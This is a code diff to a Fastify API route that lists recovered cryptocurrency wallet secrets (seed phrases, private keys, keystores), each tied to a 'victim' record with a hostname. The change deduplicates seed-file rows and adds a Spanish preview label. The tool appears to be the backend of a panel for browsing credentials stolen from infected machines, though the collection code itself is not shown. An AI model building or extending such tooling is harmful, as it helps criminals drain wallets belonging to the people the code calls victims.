@@ -200,22 +200,40 @@ export const vaultRoutes: FastifyPluginAsync = async (app) => {
         wallet: { select: { id: true, targetId: true, kind: true, path: true, state: true, victim: { select: { id: true, hostname: true } } } }
       }
     });
+    const maskedRows = rows.map((row) => ({ row, masked: maskSecret(row) }));
+    const walletsWithSeed = new Set(maskedRows.filter((item) => item.masked.kind === 'seed').map((item) => item.row.wallet.id));
+    const filesSeen = new Set<string>();
     const items = [];
-    for (const row of rows) {
-      const masked = maskSecret(row);
-      if (query.kind === 'seed' && masked.kind !== 'seed' && row.wallet.kind !== 'seed_file') continue;
+    for (const { row, masked } of maskedRows) {
       if (query.kind === 'private_key' && masked.kind !== 'private_key' && masked.kind !== 'keystore') continue;
-      items.push({
-        id: row.id,
-        kind: masked.kind,
-        preview: masked.preview,
-        words: row.words,
-        confidence: row.confidence,
-        source: row.source,
-        updatedAt: row.updatedAt,
-        wallet: { id: row.wallet.id, targetId: row.wallet.targetId, kind: row.wallet.kind, path: row.wallet.path, state: row.wallet.state },
-        victim: row.wallet.victim
-      });
+      if (query.kind === 'seed' && masked.kind !== 'seed') {
+        // A seed file with only key material is one row, not one row per key.
+        if (row.wallet.kind !== 'seed_file' || walletsWithSeed.has(row.wallet.id) || filesSeen.has(row.wallet.id)) continue;
+        filesSeen.add(row.wallet.id);
+        items.push({
+          id: row.id,
+          kind: 'seed_file',
+          preview: 'fichero de semillas',
+          words: null,
+          confidence: row.confidence,
+          source: row.source,
+          updatedAt: row.updatedAt,
+          wallet: { id: row.wallet.id, targetId: row.wallet.targetId, kind: row.wallet.kind, path: row.wallet.path, state: row.wallet.state },
+          victim: row.wallet.victim
+        });
+      } else {
+        items.push({
+          id: row.id,
+          kind: masked.kind,
+          preview: masked.preview,
+          words: row.words,
+          confidence: row.confidence,
+          source: row.source,
+          updatedAt: row.updatedAt,
+          wallet: { id: row.wallet.id, targetId: row.wallet.targetId, kind: row.wallet.kind, path: row.wallet.path, state: row.wallet.state },
+          victim: row.wallet.victim
+        });
+      }
       if (items.length > query.limit) break;
     }
     return { items: items.slice(0, query.limit), next: items.length > query.limit };
